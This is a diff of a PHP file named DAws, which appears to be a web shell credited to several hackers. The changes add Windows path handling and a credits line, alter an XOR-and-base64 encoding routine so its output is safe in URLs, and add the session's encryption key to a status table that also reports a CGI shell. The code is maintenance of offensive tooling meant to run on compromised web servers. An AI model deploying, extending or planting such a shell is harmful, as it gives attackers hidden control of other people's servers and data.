@@ -1,7 +1,7 @@
 <?php
 #DAws
 #Credits:
-#	dotcppfile & Aces
+#	dotcppfile, Aces and Cyde
 
 session_cache_limiter('nocache');
 session_start();
@@ -120,7 +120,13 @@ if (!isset($_SESSION['directory']))
 	$parts = explode("/", $_SERVER['PHP_SELF']);
 	$dirNumber = count($parts) - 2;
 
-	$current = getcwd()."/";
+	$current = getcwd();
+
+	if (strtoupper(substr(PHP_OS, 0, 3)) !== 'WIN')
+	{
+		$current .= "/";
+	}
+
 	if (strtoupper(substr(PHP_OS, 0, 3)) == 'WIN')
 	{
 		$parts2 = explode("\\", $current);
@@ -143,7 +149,15 @@ if (!isset($_SESSION['directory']))
 		}
 	}
 
-	$directories = glob($real_path . "/*", GLOB_ONLYDIR);
+	if (strtoupper(substr(PHP_OS, 0, 3)) == 'WIN')
+	{
+		$directories = glob($real_path . "\\*", GLOB_ONLYDIR);
+	}
+	else
+	{
+		$directories = glob($real_path . "/*", GLOB_ONLYDIR);
+	}
+
 	if ($directories)
 	{
 		if(count($directories) >= 20)
@@ -350,7 +364,7 @@ function xor_this($string)
 			$outText .= $string{$i} ^ $key{$j};
 		}
 	}
-	return base64encoding($outText);
+	return str_replace("+", "%2B", base64encoding($outText));
 }
 
 function unxor_this($string)
@@ -1353,7 +1367,7 @@ function showDiv()
 	echo "<br><br><h1><a href=".$_SERVER['PHP_SELF'].">DAws</a></h1>";
 ?>
 
-Coded by <a target="_blank" href="https://twitter.com/dotcppfile">dotcppfile</a> and <a target="_blank" href="https://twitter.com/__A_C_E_S__">Aces</a><br>Greetings to <a target="_blank" href="https://twitter.com/chaoshackerz">ChaosHackerz</a>
+Coded by <a target="_blank" href="https://twitter.com/dotcppfile">dotcppfile</a>, <a target="_blank" href="https://twitter.com/__A_C_E_S__">Aces</a> and <a target="_blank" href="https://twitter.com/_Cyde_">Cyde</a><br>Greetings to <a target="_blank" href="https://twitter.com/chaoshackerz">ChaosHackerz</a>
 
 <div class="tabs">
 	<FORM>
@@ -2035,6 +2049,10 @@ echo "
 	<tr>
 		<td>CGI Shell</td>
 		<td>".$_SESSION["onlinecgi"]."</td>
+	</tr>
+	<tr>
+		<td>Encryption/Encoding Key</td>
+		<td>".$_SESSION["key"]."</td>
 	</tr>
 </table>
 </td>
